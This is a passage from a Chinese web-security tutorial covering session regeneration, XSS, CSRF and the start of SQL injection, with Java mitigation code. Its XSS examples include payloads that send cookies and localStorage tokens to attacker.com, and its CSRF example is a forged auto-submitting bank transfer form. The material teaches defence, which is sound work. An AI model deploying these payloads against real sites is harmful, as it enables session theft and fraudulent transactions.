</span><span id="__span-125-19"><a id="__codelineno-125-19" name="__codelineno-125-19" href="#__codelineno-125-19"></a><span class="w">    </span><span class="c1">// 创建新会话</span>
</span><span id="__span-125-20"><a id="__codelineno-125-20" name="__codelineno-125-20" href="#__codelineno-125-20"></a><span class="w">    </span><span class="n">HttpSession</span><span class="w"> </span><span class="n">newSession</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
</span><span id="__span-125-21"><a id="__codelineno-125-21" name="__codelineno-125-21" href="#__codelineno-125-21"></a>
</span><span id="__span-125-22"><a id="__codelineno-125-22" name="__codelineno-125-22" href="#__codelineno-125-22"></a><span class="w">    </span><span class="c1">// 恢复会话数据</span>
</span><span id="__span-125-23"><a id="__codelineno-125-23" name="__codelineno-125-23" href="#__codelineno-125-23"></a><span class="w">    </span><span class="n">attributes</span><span class="p">.</span><span class="na">forEach</span><span class="p">(</span><span class="n">newSession</span><span class="p">::</span><span class="n">setAttribute</span><span class="p">);</span>
</span><span id="__span-125-24"><a id="__codelineno-125-24" name="__codelineno-125-24" href="#__codelineno-125-24"></a><span class="p">}</span>
</span></code></pre></div></p>
<h3 id="3-跨站脚本攻击xss---cross-site-scripting">3. 跨站脚本攻击（XSS - Cross-Site Scripting）<a class="headerlink" href="#3-跨站脚本攻击xss---cross-site-scripting" title="链接到此标题">&para;</a></h3>
<p><strong>攻击类型：</strong></p>
<ol>
<li><strong>存储型XSS</strong>：恶意脚本存储在服务器（如评论）</li>
<li><strong>反射型XSS</strong>：恶意脚本在URL参数中</li>
<li><strong>DOM型XSS</strong>：通过修改DOM执行脚本</li>
</ol>
<p><strong>攻击示例：</strong>
<div class="language-html highlight"><pre><span></span><code><span id="__span-126-1"><a id="__codelineno-126-1" name="__codelineno-126-1" href="#__codelineno-126-1"></a><span class="cm">&lt;!-- 用户输入 --&gt;</span>
</span><span id="__span-126-2"><a id="__codelineno-126-2" name="__codelineno-126-2" href="#__codelineno-126-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-126-3"><a id="__codelineno-126-3" name="__codelineno-126-3" href="#__codelineno-126-3"></a><span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://attacker.com/steal?cookie=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
</span><span id="__span-126-4"><a id="__codelineno-126-4" name="__codelineno-126-4" href="#__codelineno-126-4"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-126-5"><a id="__codelineno-126-5" name="__codelineno-126-5" href="#__codelineno-126-5"></a>
</span><span id="__span-126-6"><a id="__codelineno-126-6" name="__codelineno-126-6" href="#__codelineno-126-6"></a><span class="cm">&lt;!-- 或窃取Token --&gt;</span>
</span><span id="__span-126-7"><a id="__codelineno-126-7" name="__codelineno-126-7" href="#__codelineno-126-7"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;x&quot;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;fetch(&#39;http://attacker.com/steal&#39;, {</span>
</span><span id="__span-126-8"><a id="__codelineno-126-8" name="__codelineno-126-8" href="#__codelineno-126-8"></a><span class="s">  method: &#39;POST&#39;,</span>
</span><span id="__span-126-9"><a id="__codelineno-126-9" name="__codelineno-126-9" href="#__codelineno-126-9"></a><span class="s">  body: localStorage.getItem(&#39;token&#39;)</span>
</span><span id="__span-126-10"><a id="__codelineno-126-10" name="__codelineno-126-10" href="#__codelineno-126-10"></a><span class="s">})&quot;</span><span class="p">&gt;</span>
</span></code></pre></div></p>
<p><strong>防护措施：</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-127-1"><a id="__codelineno-127-1" name="__codelineno-127-1" href="#__codelineno-127-1"></a><span class="cm">/**</span>
</span><span id="__span-127-2"><a id="__codelineno-127-2" name="__codelineno-127-2" href="#__codelineno-127-2"></a><span class="cm"> * 输出编码</span>
</span><span id="__span-127-3"><a id="__codelineno-127-3" name="__codelineno-127-3" href="#__codelineno-127-3"></a><span class="cm"> */</span>
</span><span id="__span-127-4"><a id="__codelineno-127-4" name="__codelineno-127-4" href="#__codelineno-127-4"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">XSSProtection</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-127-5"><a id="__codelineno-127-5" name="__codelineno-127-5" href="#__codelineno-127-5"></a>
</span><span id="__span-127-6"><a id="__codelineno-127-6" name="__codelineno-127-6" href="#__codelineno-127-6"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-127-7"><a id="__codelineno-127-7" name="__codelineno-127-7" href="#__codelineno-127-7"></a><span class="cm">     * HTML实体编码</span>
</span><span id="__span-127-8"><a id="__codelineno-127-8" name="__codelineno-127-8" href="#__codelineno-127-8"></a><span class="cm">     */</span>
</span><span id="__span-127-9"><a id="__codelineno-127-9" name="__codelineno-127-9" href="#__codelineno-127-9"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">encodeForHTML</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-127-10"><a id="__codelineno-127-10" name="__codelineno-127-10" href="#__codelineno-127-10"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">StringEscapeUtils</span><span class="p">.</span><span class="na">escapeHtml4</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
</span><span id="__span-127-11"><a id="__codelineno-127-11" name="__codelineno-127-11" href="#__codelineno-127-11"></a><span class="w">        </span><span class="c1">// &lt; 转换为 &amp;lt;</span>
</span><span id="__span-127-12"><a id="__codelineno-127-12" name="__codelineno-127-12" href="#__codelineno-127-12"></a><span class="w">        </span><span class="c1">// &gt; 转换为 &amp;gt;</span>
</span><span id="__span-127-13"><a id="__codelineno-127-13" name="__codelineno-127-13" href="#__codelineno-127-13"></a><span class="w">        </span><span class="c1">// &quot; 转换为 &amp;quot;</span>
</span><span id="__span-127-14"><a id="__codelineno-127-14" name="__codelineno-127-14" href="#__codelineno-127-14"></a><span class="w">        </span><span class="c1">// &#39; 转换为 &amp;#x27;</span>
</span><span id="__span-127-15"><a id="__codelineno-127-15" name="__codelineno-127-15" href="#__codelineno-127-15"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-127-16"><a id="__codelineno-127-16" name="__codelineno-127-16" href="#__codelineno-127-16"></a>
</span><span id="__span-127-17"><a id="__codelineno-127-17" name="__codelineno-127-17" href="#__codelineno-127-17"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-127-18"><a id="__codelineno-127-18" name="__codelineno-127-18" href="#__codelineno-127-18"></a><span class="cm">     * JavaScript编码</span>
</span><span id="__span-127-19"><a id="__codelineno-127-19" name="__codelineno-127-19" href="#__codelineno-127-19"></a><span class="cm">     */</span>
</span><span id="__span-127-20"><a id="__codelineno-127-20" name="__codelineno-127-20" href="#__codelineno-127-20"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">encodeForJavaScript</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-127-21"><a id="__codelineno-127-21" name="__codelineno-127-21" href="#__codelineno-127-21"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">StringEscapeUtils</span><span class="p">.</span><span class="na">escapeEcmaScript</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
</span><span id="__span-127-22"><a id="__codelineno-127-22" name="__codelineno-127-22" href="#__codelineno-127-22"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-127-23"><a id="__codelineno-127-23" name="__codelineno-127-23" href="#__codelineno-127-23"></a>
</span><span id="__span-127-24"><a id="__codelineno-127-24" name="__codelineno-127-24" href="#__codelineno-127-24"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-127-25"><a id="__codelineno-127-25" name="__codelineno-127-25" href="#__codelineno-127-25"></a><span class="cm">     * URL编码</span>
</span><span id="__span-127-26"><a id="__codelineno-127-26" name="__codelineno-127-26" href="#__codelineno-127-26"></a><span class="cm">     */</span>
</span><span id="__span-127-27"><a id="__codelineno-127-27" name="__codelineno-127-27" href="#__codelineno-127-27"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">encodeForURL</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-127-28"><a id="__codelineno-127-28" name="__codelineno-127-28" href="#__codelineno-127-28"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">URLEncoder</span><span class="p">.</span><span class="na">encode</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">UTF_8</span><span class="p">);</span>
</span><span id="__span-127-29"><a id="__codelineno-127-29" name="__codelineno-127-29" href="#__codelineno-127-29"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-127-30"><a id="__codelineno-127-30" name="__codelineno-127-30" href="#__codelineno-127-30"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong>其他防护：</strong>
- Content Security Policy (CSP) 头
- HttpOnly Cookie（防止JavaScript访问）
- 输入验证和过滤
- 使用安全的模板引擎（自动转义）</p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-128-1"><a id="__codelineno-128-1" name="__codelineno-128-1" href="#__codelineno-128-1"></a><span class="c1">// Spring Boot CSP配置</span>
</span><span id="__span-128-2"><a id="__codelineno-128-2" name="__codelineno-128-2" href="#__codelineno-128-2"></a><span class="nd">@Configuration</span>
</span><span id="__span-128-3"><a id="__codelineno-128-3" name="__codelineno-128-3" href="#__codelineno-128-3"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SecurityHeadersConfig</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-128-4"><a id="__codelineno-128-4" name="__codelineno-128-4" href="#__codelineno-128-4"></a><span class="w">    </span><span class="nd">@Bean</span>
</span><span id="__span-128-5"><a id="__codelineno-128-5" name="__codelineno-128-5" href="#__codelineno-128-5"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">SecurityFilterChain</span><span class="w"> </span><span class="nf">filterChain</span><span class="p">(</span><span class="n">HttpSecurity</span><span class="w"> </span><span class="n">http</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-128-6"><a id="__codelineno-128-6" name="__codelineno-128-6" href="#__codelineno-128-6"></a><span class="w">        </span><span class="n">http</span><span class="p">.</span><span class="na">headers</span><span class="p">()</span>
</span><span id="__span-128-7"><a id="__codelineno-128-7" name="__codelineno-128-7" href="#__codelineno-128-7"></a><span class="w">            </span><span class="p">.</span><span class="na">contentSecurityPolicy</span><span class="p">(</span><span class="s">&quot;default-src &#39;self&#39;; script-src &#39;self&#39;&quot;</span><span class="p">);</span>
</span><span id="__span-128-8"><a id="__codelineno-128-8" name="__codelineno-128-8" href="#__codelineno-128-8"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">http</span><span class="p">.</span><span class="na">build</span><span class="p">();</span>
</span><span id="__span-128-9"><a id="__codelineno-128-9" name="__codelineno-128-9" href="#__codelineno-128-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-128-10"><a id="__codelineno-128-10" name="__codelineno-128-10" href="#__codelineno-128-10"></a><span class="p">}</span>
</span></code></pre></div>
<h3 id="4-跨站请求伪造csrf---cross-site-request-forgery">4. 跨站请求伪造（CSRF - Cross-Site Request Forgery）<a class="headerlink" href="#4-跨站请求伪造csrf---cross-site-request-forgery" title="链接到此标题">&para;</a></h3>
<p><strong>攻击流程：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-129-1"><a id="__codelineno-129-1" name="__codelineno-129-1" href="#__codelineno-129-1"></a>1. 用户登录可信网站A，获得Cookie
</span><span id="__span-129-2"><a id="__codelineno-129-2" name="__codelineno-129-2" href="#__codelineno-129-2"></a>2. 用户访问恶意网站B（未退出A）
</span><span id="__span-129-3"><a id="__codelineno-129-3" name="__codelineno-129-3" href="#__codelineno-129-3"></a>3. 网站B返回攻击代码，向网站A发起请求
</span><span id="__span-129-4"><a id="__codelineno-129-4" name="__codelineno-129-4" href="#__codelineno-129-4"></a>4. 浏览器自动携带网站A的Cookie
</span><span id="__span-129-5"><a id="__codelineno-129-5" name="__codelineno-129-5" href="#__codelineno-129-5"></a>5. 网站A收到请求，以为是用户真实操作
</span></code></pre></div></p>
<p><strong>攻击示例：</strong>
<div class="language-html highlight"><pre><span></span><code><span id="__span-130-1"><a id="__codelineno-130-1" name="__codelineno-130-1" href="#__codelineno-130-1"></a><span class="cm">&lt;!-- 恶意网站B的页面 --&gt;</span>
</span><span id="__span-130-2"><a id="__codelineno-130-2" name="__codelineno-130-2" href="#__codelineno-130-2"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://bank.com/transfer?to=attacker&amp;amount=1000&quot;</span> <span class="p">/&gt;</span>
</span><span id="__span-130-3"><a id="__codelineno-130-3" name="__codelineno-130-3" href="#__codelineno-130-3"></a>
</span><span id="__span-130-4"><a id="__codelineno-130-4" name="__codelineno-130-4" href="#__codelineno-130-4"></a><span class="cm">&lt;!-- 或者使用表单自动提交 --&gt;</span>
</span><span id="__span-130-5"><a id="__codelineno-130-5" name="__codelineno-130-5" href="#__codelineno-130-5"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://bank.com/transfer&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
</span><span id="__span-130-6"><a id="__codelineno-130-6" name="__codelineno-130-6" href="#__codelineno-130-6"></a>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;to&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;attacker&quot;</span> <span class="p">/&gt;</span>
</span><span id="__span-130-7"><a id="__codelineno-130-7" name="__codelineno-130-7" href="#__codelineno-130-7"></a>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;amount&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1000&quot;</span> <span class="p">/&gt;</span>
</span><span id="__span-130-8"><a id="__codelineno-130-8" name="__codelineno-130-8" href="#__codelineno-130-8"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span><span id="__span-130-9"><a id="__codelineno-130-9" name="__codelineno-130-9" href="#__codelineno-130-9"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></code></pre></div></p>
<p><strong>防护措施：</strong></p>
<ol>
<li><strong>CSRF Token（同步令牌模式）</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-131-1"><a id="__codelineno-131-1" name="__codelineno-131-1" href="#__codelineno-131-1"></a><span class="cm">/**</span>
</span><span id="__span-131-2"><a id="__codelineno-131-2" name="__codelineno-131-2" href="#__codelineno-131-2"></a><span class="cm"> * CSRF Token验证</span>
</span><span id="__span-131-3"><a id="__codelineno-131-3" name="__codelineno-131-3" href="#__codelineno-131-3"></a><span class="cm"> */</span>
</span><span id="__span-131-4"><a id="__codelineno-131-4" name="__codelineno-131-4" href="#__codelineno-131-4"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CSRFProtection</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-131-5"><a id="__codelineno-131-5" name="__codelineno-131-5" href="#__codelineno-131-5"></a>
</span><span id="__span-131-6"><a id="__codelineno-131-6" name="__codelineno-131-6" href="#__codelineno-131-6"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-131-7"><a id="__codelineno-131-7" name="__codelineno-131-7" href="#__codelineno-131-7"></a><span class="cm">     * 生成CSRF Token</span>
</span><span id="__span-131-8"><a id="__codelineno-131-8" name="__codelineno-131-8" href="#__codelineno-131-8"></a><span class="cm">     */</span>
</span><span id="__span-131-9"><a id="__codelineno-131-9" name="__codelineno-131-9" href="#__codelineno-131-9"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">generateToken</span><span class="p">(</span><span class="n">HttpSession</span><span class="w"> </span><span class="n">session</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-131-10"><a id="__codelineno-131-10" name="__codelineno-131-10" href="#__codelineno-131-10"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UUID</span><span class="p">.</span><span class="na">randomUUID</span><span class="p">().</span><span class="na">toString</span><span class="p">();</span>
</span><span id="__span-131-11"><a id="__codelineno-131-11" name="__codelineno-131-11" href="#__codelineno-131-11"></a><span class="w">        </span><span class="n">session</span><span class="p">.</span><span class="na">setAttribute</span><span class="p">(</span><span class="s">&quot;CSRF_TOKEN&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">token</span><span class="p">);</span>
</span><span id="__span-131-12"><a id="__codelineno-131-12" name="__codelineno-131-12" href="#__codelineno-131-12"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">token</span><span class="p">;</span>
</span><span id="__span-131-13"><a id="__codelineno-131-13" name="__codelineno-131-13" href="#__codelineno-131-13"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-131-14"><a id="__codelineno-131-14" name="__codelineno-131-14" href="#__codelineno-131-14"></a>
</span><span id="__span-131-15"><a id="__codelineno-131-15" name="__codelineno-131-15" href="#__codelineno-131-15"></a><span class="w">    </span><span class="cm">/**</span>
</span><span id="__span-131-16"><a id="__codelineno-131-16" name="__codelineno-131-16" href="#__codelineno-131-16"></a><span class="cm">     * 验证CSRF Token</span>
</span><span id="__span-131-17"><a id="__codelineno-131-17" name="__codelineno-131-17" href="#__codelineno-131-17"></a><span class="cm">     */</span>
</span><span id="__span-131-18"><a id="__codelineno-131-18" name="__codelineno-131-18" href="#__codelineno-131-18"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">validateToken</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-131-19"><a id="__codelineno-131-19" name="__codelineno-131-19" href="#__codelineno-131-19"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">sessionToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">()</span>
</span><span id="__span-131-20"><a id="__codelineno-131-20" name="__codelineno-131-20" href="#__codelineno-131-20"></a><span class="w">            </span><span class="p">.</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&quot;CSRF_TOKEN&quot;</span><span class="p">);</span>
</span><span id="__span-131-21"><a id="__codelineno-131-21" name="__codelineno-131-21" href="#__codelineno-131-21"></a><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">requestToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&quot;_csrf&quot;</span><span class="p">);</span>
</span><span id="__span-131-22"><a id="__codelineno-131-22" name="__codelineno-131-22" href="#__codelineno-131-22"></a>
</span><span id="__span-131-23"><a id="__codelineno-131-23" name="__codelineno-131-23" href="#__codelineno-131-23"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">sessionToken</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">sessionToken</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">requestToken</span><span class="p">);</span>
</span><span id="__span-131-24"><a id="__codelineno-131-24" name="__codelineno-131-24" href="#__codelineno-131-24"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-131-25"><a id="__codelineno-131-25" name="__codelineno-131-25" href="#__codelineno-131-25"></a><span class="p">}</span>
</span></code></pre></div></li>
</ol>
<div class="language-html highlight"><pre><span></span><code><span id="__span-132-1"><a id="__codelineno-132-1" name="__codelineno-132-1" href="#__codelineno-132-1"></a><span class="cm">&lt;!-- 在表单中包含CSRF Token --&gt;</span>
</span><span id="__span-132-2"><a id="__codelineno-132-2" name="__codelineno-132-2" href="#__codelineno-132-2"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;/transfer&quot;</span><span class="p">&gt;</span>
</span><span id="__span-132-3"><a id="__codelineno-132-3" name="__codelineno-132-3" href="#__codelineno-132-3"></a>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;_csrf&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;${csrfToken}&quot;</span> <span class="p">/&gt;</span>
</span><span id="__span-132-4"><a id="__codelineno-132-4" name="__codelineno-132-4" href="#__codelineno-132-4"></a>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;to&quot;</span> <span class="p">/&gt;</span>
</span><span id="__span-132-5"><a id="__codelineno-132-5" name="__codelineno-132-5" href="#__codelineno-132-5"></a>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;number&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;amount&quot;</span> <span class="p">/&gt;</span>
</span><span id="__span-132-6"><a id="__codelineno-132-6" name="__codelineno-132-6" href="#__codelineno-132-6"></a>  <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span><span class="p">&gt;</span>Transfer<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span><span id="__span-132-7"><a id="__codelineno-132-7" name="__codelineno-132-7" href="#__codelineno-132-7"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></code></pre></div>
<ol>
<li>
<p><strong>SameSite Cookie属性</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-133-1"><a id="__codelineno-133-1" name="__codelineno-133-1" href="#__codelineno-133-1"></a><span class="n">Cookie</span><span class="w"> </span><span class="n">cookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Cookie</span><span class="p">(</span><span class="s">&quot;SESSIONID&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">sessionId</span><span class="p">);</span>
</span><span id="__span-133-2"><a id="__codelineno-133-2" name="__codelineno-133-2" href="#__codelineno-133-2"></a><span class="n">cookie</span><span class="p">.</span><span class="na">setSameSite</span><span class="p">(</span><span class="s">&quot;Strict&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// 或 &quot;Lax&quot;</span>
</span><span id="__span-133-3"><a id="__codelineno-133-3" name="__codelineno-133-3" href="#__codelineno-133-3"></a><span class="c1">// Strict: 完全禁止第三方Cookie</span>
</span><span id="__span-133-4"><a id="__codelineno-133-4" name="__codelineno-133-4" href="#__codelineno-133-4"></a><span class="c1">// Lax: 允许部分第三方Cookie（GET请求）</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>验证Referer/Origin头</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-134-1"><a id="__codelineno-134-1" name="__codelineno-134-1" href="#__codelineno-134-1"></a><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">validateReferer</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-134-2"><a id="__codelineno-134-2" name="__codelineno-134-2" href="#__codelineno-134-2"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">referer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&quot;Referer&quot;</span><span class="p">);</span>
</span><span id="__span-134-3"><a id="__codelineno-134-3" name="__codelineno-134-3" href="#__codelineno-134-3"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">origin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&quot;Origin&quot;</span><span class="p">);</span>
</span><span id="__span-134-4"><a id="__codelineno-134-4" name="__codelineno-134-4" href="#__codelineno-134-4"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">referer</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">referer</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;https://yourdomain.com&quot;</span><span class="p">);</span>
</span><span id="__span-134-5"><a id="__codelineno-134-5" name="__codelineno-134-5" href="#__codelineno-134-5"></a><span class="p">}</span>
</span></code></pre></div></p>
</li>
<li>
<p><strong>双重Cookie验证</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-135-1"><a id="__codelineno-135-1" name="__codelineno-135-1" href="#__codelineno-135-1"></a><span class="c1">// 设置CSRF Cookie</span>
</span><span id="__span-135-2"><a id="__codelineno-135-2" name="__codelineno-135-2" href="#__codelineno-135-2"></a><span class="n">Cookie</span><span class="w"> </span><span class="n">csrfCookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Cookie</span><span class="p">(</span><span class="s">&quot;XSRF-TOKEN&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">token</span><span class="p">);</span>
</span><span id="__span-135-3"><a id="__codelineno-135-3" name="__codelineno-135-3" href="#__codelineno-135-3"></a><span class="n">response</span><span class="p">.</span><span class="na">addCookie</span><span class="p">(</span><span class="n">csrfCookie</span><span class="p">);</span>
</span><span id="__span-135-4"><a id="__codelineno-135-4" name="__codelineno-135-4" href="#__codelineno-135-4"></a>
</span><span id="__span-135-5"><a id="__codelineno-135-5" name="__codelineno-135-5" href="#__codelineno-135-5"></a><span class="c1">// 验证：Cookie值 == Header值</span>
</span><span id="__span-135-6"><a id="__codelineno-135-6" name="__codelineno-135-6" href="#__codelineno-135-6"></a><span class="n">String</span><span class="w"> </span><span class="n">cookieToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getCookieValue</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;XSRF-TOKEN&quot;</span><span class="p">);</span>
</span><span id="__span-135-7"><a id="__codelineno-135-7" name="__codelineno-135-7" href="#__codelineno-135-7"></a><span class="n">String</span><span class="w"> </span><span class="n">headerToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&quot;X-XSRF-TOKEN&quot;</span><span class="p">);</span>
</span><span id="__span-135-8"><a id="__codelineno-135-8" name="__codelineno-135-8" href="#__codelineno-135-8"></a><span class="k">return</span><span class="w"> </span><span class="n">cookieToken</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">headerToken</span><span class="p">);</span>
</span></code></pre></div></p>
</li>
</ol>
<h3 id="5-sql注入攻击sql-injection">5. SQL注入攻击（SQL Injection）<a class="headerlink" href="#5-sql注入攻击sql-injection" title="链接到此标题">&para;</a></h3>
<p><strong>攻击示例：</strong>
<div class="language-java highlight"><pre><span></span><code><span id="__span-136-1"><a id="__codelineno-136-1" name="__codelineno-136-1" href="#__codelineno-136-1"></a><span class="c1">// 不安全的代码</span>
</span><span id="__span-136-2"><a id="__codelineno-136-2" name="__codelineno-136-2" href="#__codelineno-136-2"></a><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&quot;username&quot;</span><span class="p">);</span>
</span><span id="__span-136-3"><a id="__codelineno-136-3" name="__codelineno-136-3" href="#__codelineno-136-3"></a><span class="n">String</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&quot;password&quot;</span><span class="p">);</span>
